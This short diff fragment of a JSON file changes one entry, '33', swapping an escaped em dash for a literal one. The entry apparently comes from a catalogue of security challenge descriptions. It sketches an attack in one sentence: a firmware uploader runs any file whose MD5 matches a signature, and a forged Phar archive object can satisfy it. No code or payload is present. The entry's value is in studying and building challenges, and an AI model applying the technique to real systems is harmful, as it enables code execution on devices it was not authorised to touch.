-  "33": "A firmware uploader executes any file whose MD5 matches a stored signature \u2014 and a Phar archive lets you forge the object that carries both."
+  "33": "A firmware uploader executes any file whose MD5 matches a stored signature — and a Phar archive lets you forge the object that carries both."
  }
 }
